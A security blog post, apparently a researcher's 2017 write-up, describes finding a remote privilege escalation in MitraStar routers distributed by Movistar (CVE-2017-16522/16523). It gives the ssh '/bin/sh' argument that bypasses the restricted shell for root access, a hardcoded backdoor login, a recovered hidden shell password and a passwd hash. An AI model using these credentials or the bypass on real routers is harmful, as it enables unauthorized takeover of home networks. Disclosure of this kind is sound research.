<!DOCTYPE html>
<html>
  <head>
    <title>MitraStar routers Remote Privilege Escalation – j0lama – Computer engineering and hacking stuff</title>

        <meta charset="utf-8" />
    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>

    
    <meta name="description" content="In this post I will describe how I discovered the vulnerabilities CVE-2017-16522 and CVE-2017-16523. These two vulnerabilities affect some domestic routers distributed by Movistar (Telefónica). Actually, these vulnerabilities affect all the MitraStar routers with with version up to november 2017.

" />
    <meta property="og:description" content="In this post I will describe how I discovered the vulnerabilities CVE-2017-16522 and CVE-2017-16523. These two vulnerabilities affect some domestic routers distributed by Movistar (Telefónica). Actually, these vulnerabilities affect all the MitraStar routers with with version up to november 2017.

" />
    
    <meta name="author" content="j0lama" />

    
    <meta property="og:title" content="MitraStar routers Remote Privilege Escalation" />
    <meta property="twitter:title" content="MitraStar routers Remote Privilege Escalation" />
    

    <!--[if lt IE 9]>
      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <link rel="stylesheet" type="text/css" href="//style.css" />
    <link rel="alternate" type="application/rss+xml" title="j0lama - Computer engineering and hacking stuff" href="//feed.xml" />

    <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
  </head>

  <body>
    <div class="wrapper-masthead">
      <div class="container">
        <header class="masthead clearfix">
          <a href="//" class="site-avatar"><img src="https://raw.githubusercontent.com/j0lama/blog/master/images/logo.png" /></a>

          <div class="site-info">
            <h1 class="site-name"><a href="//">j0lama</a></h1>
            <p class="site-description">Computer engineering and hacking stuff</p>
          </div>

          <nav>
            <a href="//">Posts</a>
            <a href="//about">About</a>
          </nav>
        </header>
      </div>
    </div>

    <div id="main" role="main" class="container">
      <article class="post">
  <h1>MitraStar routers Remote Privilege Escalation</h1>

  <div class="entry">
    <p>In this post I will describe how I discovered the vulnerabilities <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-16522">CVE-2017-16522</a> and <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-16523">CVE-2017-16523</a>. These two vulnerabilities affect some domestic routers distributed by Movistar (Telefónica). Actually, these vulnerabilities affect all the MitraStar routers with with version up to november 2017.</p>

<p>The devices where the research has been made are the MitraStar DSL-100HN-T1 (“<em>the old</em>”) and the MitraStar GPT-2541GNAC (HGU) (“<em>the new</em>”).</p>

<p><em>The old</em> with a firmware version ES_113WJY0b16:</p>
<p align="center">
      <img src="/images/router-attack/old.jpg" />
</p>

<p><em>The new</em> with a firmware version 1.00(VNJ0)b1:</p>
<p align="center">
      <img src="/images/router-attack/new.jpg" />
</p>

<p>These two vulnerabilities can be considered as only one that elevate privileges remotely on the router avoiding the preseted shell.</p>

<h4 id="getting-access-to-the-router">Getting access to the router</h4>

<p>THe first thing that I did was a port scanning with the tool <em>nmap</em> in the old:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-F</span> &lt;router_ip&gt;
</code></pre></div></div>
<p>With the the following result:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
23/tcp    filtered telnet
53/tcp    open     domain
80/tcp    open     http
443/tcp   open     https
8080/tcp  open     http-proxy
49152/tcp open     unknown
</code></pre></div></div>

<p>This router has <em>ssh</em> running on the port 22 and with some google searches I found that the default user is <em>admin</em> and the password is under the router.
I also discovered months later with reverse engineering that in some routers exist a user call <em>zyad1234</em> with password <em>zyad1234</em> (Vulnerability CVE-2017-16523).</p>

<p>In my case, with the <em>admin</em> user I could get access to the router.</p>

<p>When yoy log in to the router throungh <em>ssh</em> the router provides you a limitate shell with some commands that allow you to modify some parameters such as the DHCP, lan parameters, and install updates and configurations. All this functions can be executed through the router’s configuration website at 192.168.1.1.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh 1234@192.168.1.3
1234@192.168.1.3<span class="s1">'s password: 
 &gt;ls
Can'</span>t find <span class="nb">command</span>: <span class="o">[</span><span class="nb">ls</span><span class="o">]</span><span class="nb">.</span> Type <span class="s1">'?'</span> <span class="k">for </span>usage
 <span class="o">&gt;</span>?
Valid commands are:
?               <span class="nb">exit            </span>save            sys             restoredefault
wan             lan             igmp            wlan            nat
routing         
 <span class="o">&gt;</span>sys
Missing subcommand. Valid subcommands are:
process         userPasswd      passwd          telnetd         state
swversion       swupdate        updatecfg       backupcfg       dumpcfg
sysdiagd        firewall        upnp            reboot          exitOnIdle
ppp             
 <span class="o">&gt;</span>sys swversion
V1.13<span class="o">(</span>WJY.0<span class="o">)</span>b15
 <span class="o">&gt;</span>
</code></pre></div></div>

<h4 id="looking-for-some-bugs">Looking for some bugs</h4>

<p>The first thing that I tried was to introduce a long string to produce a buffer overflow or some crashes:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">&gt;</span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Cant find <span class="nb">command</span>: <span class="o">[</span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa]. Type <span class="s1">'?'</span> <span class="k">for </span>usage
 <span class="o">&gt;</span>
</code></pre></div></div>

<p>With the impossibility of find a buffer overflow I introduced accidentally the <em>sh</em> command:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">&gt;</span>sh
Password:Password incorrect <span class="o">!</span>
 <span class="o">&gt;</span>
</code></pre></div></div>

<p>This output means that there is a <em>sh</em> command that requires a password and it should give you access to a more privilege shell but the password is unknown.</p>

<h4 id="using-other-versions">Using other versions</h4>

<p>Afer days without any result I decided to use the other router (<em>the new</em>). This router has a differente software version with the same pseudo-shell but with more commands such as <em>cat</em> (used to check if a specific file exists) or the <em>ps</em> command:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">&gt;</span> <span class="nb">cat</span> /etc/passwd
1234:Mt3cwxDUQQ7AY:0:0:Administrator:/:/bin/sh
 <span class="o">&gt;</span> ps
  PID USER       VSZ STAT COMMAND
    1 1234      1700 S    init
    2 1234         0 SW   <span class="o">[</span>kthreadd]
    3 1234         0 SW   <span class="o">[</span>ksoftirqd/0]
    5 1234         0 SW   <span class="o">[</span>kworker/u:0]
    6 1234         0 SW   <span class="o">[</span>migration/0]
    7 1234         0 SW   <span class="o">[</span>migration/1]
    9 1234         0 SW   <span class="o">[</span>ksoftirqd/1]
   11 1234         0 SW&lt;  <span class="o">[</span>khelper]
   54 1234         0 SW   <span class="o">[</span>sync_supers]
   56 1234         0 SW   <span class="o">[</span>bdi-default]
   58 1234         0 SW&lt;  <span class="o">[</span>kblockd]
   75 1234         0 SW   <span class="o">[</span>skbFreeTask]
   92 1234         0 SWN  <span class="o">[</span>kswapd0]
   93 1234         0 SW   <span class="o">[</span>fsnotify_mark]
   94 1234         0 SW&lt;  <span class="o">[</span>crypto]
  151 1234         0 SW   <span class="o">[</span>mtdblock0]
  156 1234         0 SW   <span class="o">[</span>mtdblock1]
  161 1234         0 SW   <span class="o">[</span>mtdblock2]
  166 1234         0 SW   <span class="o">[</span>mtdblock3]
  171 1234         0 SW   <span class="o">[</span>mtdblock4]
  176 1234         0 SW   <span class="o">[</span>mtdblock5]
  181 1234         0 SW   <span class="o">[</span>mtdblock6]
  186 1234         0 SW   <span class="o">[</span>mtdblock7]
  191 1234         0 SW   <span class="o">[</span>mtdblock8]
  202 1234         0 SW&lt;  <span class="o">[</span>linkwatch]
  212 1234         0 SW&lt;  <span class="o">[</span>deferwq]
  219 1234         0 SWN  <span class="o">[</span>jffs2_gcd_mtd2]
  220 1234         0 SWN  <span class="o">[</span>jffs2_gcd_mtd6]
  221 1234         0 SWN  <span class="o">[</span>jffs2_gcd_mtd7]
  222 1234         0 SWN  <span class="o">[</span>jffs2_gcd_mtd8]
  229 1234      2532 S &lt;  /bin/mm.exe
  233 1234      2532 S    /bin/mm.exe
  234 1234      2532 S    /bin/mm.exe
  235 1234      2532 S    /bin/mm.exe
  236 1234      2532 S    /bin/mm.exe
  237 1234      8596 S &lt;  /bin/icf.exe
  256 1234         0 DW   <span class="o">[</span>Pon]
  262 1234      8596 S &lt;  /bin/icf.exe
  263 1234      8596 S &lt;  /bin/icf.exe
  275 1234      1692 D    <span class="nb">cat</span> /dev/rgs_logger
  449 1234         0 SW   <span class="o">[</span>bcmFlwStatsTask]
  496 1234         0 SW   <span class="o">[</span>bcmsw_rx]
  515 1234         0 SW   <span class="o">[</span>bcmsw]
  525 1234         0 SW   <span class="o">[</span>wfd]
  529 1234         0 SW   <span class="o">[</span>wl0-kthrd]
  623 1234      6248 S    /bin/smd
  626 1234      6884 S    ssk
  641 1234      1444 S    dnsproxy
  644 1234      1420 S    sntp <span class="nt">-s</span> hora.ngn.rima-tde.net <span class="nt">-t</span> CET-1CEST,M3.5.0/2:
  669 1234      2048 S    dhcpd
  818 1234      3768 S    rastatus6
 1283 1234         0 SW   <span class="o">[</span>kworker/u:2]
 1320 1234      9144 S    rmt_qcsmngr <span class="nt">-m</span> 0
 1495 1234      6776 S    mcpd
 1496 1234      8760 S    omcid <span class="nt">-m</span> 0 <span class="nt">-v</span> 0 start
 1625 1234      9576 S    omcipmd <span class="nt">-m</span> 0
 1626 1234       928 S    cpuload
 1627 1234      7896 S    wlmngr <span class="nt">-m</span> 0
 1628 1234      8128 S    voiceApp <span class="nt">-m</span> 0
 1629 1234      6644 S    rmt_qcsmngr_watchDog <span class="nt">-m</span> 0
 1634 1234      6600 S    /bin/sskwatchdog
 1643 1234      7896 S    wlmngr <span class="nt">-m</span> 0
 1644 1234      7896 S    wlmngr <span class="nt">-m</span> 0
 1668 1234      8128 S    voiceApp <span class="nt">-m</span> 0
 1669 1234      8128 S    voiceApp <span class="nt">-m</span> 0
 1697 1234      1700 S    -/bin/sh <span class="nt">-l</span> <span class="nt">-c</span> consoled
 1699 1234      9036 S    consoled
 1706 1234      1404 S    /bin/wlevt
 1709 1234      2532 S &lt;  /bin/mm.exe
 1710 1234      2532 S &lt;  /bin/mm.exe
 1711 1234      2532 S &lt;  /bin/mm.exe
 1712 1234      2532 S &lt;  /bin/mm.exe
 1713 1234      2532 S &lt;  /bin/mm.exe
 1714 1234      2532 S &lt;  /bin/mm.exe
 1715 1234      2532 S &lt;  /bin/mm.exe
 1718 1234      2532 S &lt;  /bin/mm.exe
 1719 1234      2532 S &lt;  /bin/mm.exe
 1720 1234      2532 S    /bin/mm.exe
 1721 1234      8128 S &lt;  voiceApp <span class="nt">-m</span> 0
 1722 1234      8128 S &lt;  voiceApp <span class="nt">-m</span> 0
 1723 1234      8128 S    voiceApp <span class="nt">-m</span> 0
 1845 1234      1628 S    /bin/lld2d br0
 1850 1234      1552 S    /bin/eapd
 1853 1234      1920 S    /bin/nas
 1863 1234      1652 S    /bin/acsd
 1865 1234      2972 S    /bin/wps_monitor
 1936 1234      1020 S    radvd <span class="nt">-C</span> /var/radvd.conf
 2101 1234      9144 S    rmt_qcsmngr <span class="nt">-m</span> 0
 2102 1234      9144 S    rmt_qcsmngr <span class="nt">-m</span> 0
 2103 1234      9144 S    rmt_qcsmngr <span class="nt">-m</span> 0
 2104 1234      9144 S    rmt_qcsmngr <span class="nt">-m</span> 0
 7349 1234         0 SW   <span class="o">[</span>kworker/1:0]
 7638 1234         0 SW   <span class="o">[</span>kworker/0:2]
 8290 1234         0 SW   <span class="o">[</span>flush-mtd-unmap]
 8565 1234      9300 S    sshd <span class="nt">-m</span> 0
 8578 1234      9308 S    sshd <span class="nt">-m</span> 0
 8847 1234         0 SW   <span class="o">[</span>kworker/0:0]
 8956 1234         0 SW   <span class="o">[</span>kworker/1:1]
 9455 1234         0 SW   <span class="o">[</span>kworker/1:2]
 9944 1234         0 SW   <span class="o">[</span>kworker/0:1]
10047 1234      1696 S    sh <span class="nt">-c</span> ps
10048 1234      1700 R    ps
25183 1234         0 SW   <span class="o">[</span>kworker/1:3]
30628 1234      1696 S    sh <span class="nt">-c</span> /bin/sh
30629 1234      1696 S    /bin/sh
30892 1234      9256 R    ./sshd
32030 1234      1696 S    sh <span class="nt">-c</span> /bin32031 1234      1696 S    /bin32079 1234      9256 R    ./sshd <span class="nt">-m</span> 0
</code></pre></div></div>

<p>After explore some commands I found the <em>deviceinfo</em> command that offers the following possibilities:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">&gt;</span> deviceinfo
Usage: deviceinfo show serialnumber
   deviceinfo show ploampw
   deviceinfo <span class="nb">set </span>serialnumber &lt;value&gt;
   deviceinfo <span class="nb">set </span>ploampw &lt;value&gt;
   deviceinfo show datetime
   deviceinfo show cpuload
   deviceinfo show meminfo
   deviceinfo show file &lt;path&gt;
   deviceinfo show interface
   deviceinfo <span class="nt">--help</span>
 <span class="o">&gt;</span> 
</code></pre></div></div>

<p>The command <em>deviceinfo show file /</em> works as the <em>ls</em> command and allows us to list all the files and directories that are in /:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">&gt;</span> deviceinfo show file /
app          debug        linuxrc      sbin         usrcfg
bin          dev          mnt          sys          var
cfg_upgrade  etc          opt          tmp          vmlinux.lz
data         lib          proc         usr          webs
 <span class="o">&gt;</span> 
</code></pre></div></div>

<p>I was generating the file system tree and looking for some files with information about the <em>sh</em> command password but I didn’t find anything.</p>

<h4 id="the-vulnerability">The vulnerability</h4>
<p>The next day I came back to <em>the old</em> to try new things but surprisingly I decided to try something unusual. Instead of connect with the router with the command *ssh admin@<router_ip>*, I decided to add the path to the *sh* binary (/bin/sh) as second parameter because by default *ssh* execute the command passed as argument.</router_ip></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh 1234@192.168.1.2 &lt;comand&gt;
</code></pre></div></div>

<p>The output was the following:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh 1234@192.168.1.3 /bin/sh
1234@192.168.1.3<span class="s1">'s password: 

					

</span></code></pre></div></div>

<p>This looked like there was something wrong and I was waiting for connection but I tried to introduce the <em>ls</em> command and surprisingly was executed succesfully!
I had access to an privilege shell with a complete root access to the system.</p>

<h4 id="some-reverse-engineering">Some reverse engineering</h4>

<p>I found that the default shell for ssh was a binary call cmdsh in the /bin/ folder.</p>

<p>I was still needing the <em>sh</em> command password so I decided to bring the binary to my laptop an execute IDA Pro.
The binary was compiled for MIPS architecture and I only needed to find where the string “Password incorrect!” is used to see a condition before, that compare a string with the string “c93vu02jp4z04”, the <em>sh</em> password.</p>

<p align="center">
      <img src="/images/router-attack/ida.png" />
</p>

<h4 id="conclutions">Conclutions</h4>

<p>I hope you had enjoy reading as much I do writing this post and over all learning something new.
If you want more post like this one make it me know thorugh Twitter or buying me a <a href="https://ko-fi.com/jolama">Ko-Fi</a></p>


  </div>

  <div class="date">
    Written on October 23, 2017
  </div>

  
</article>

    </div>

    <div class="wrapper-footer">
      <div class="container">
        <footer class="footer">
          



<a href="https://github.com/j0lama"><i class="svg-icon github"></i></a>




<a href="https://www.twitter.com/j0lama"><i class="svg-icon twitter"></i></a>
<a href="http://stackoverflow.com/users/9401292/j0lama"><i class="svg-icon stackoverflow"></i></a>


        </footer>
      </div>
    </div>

    

  </body>
</html>
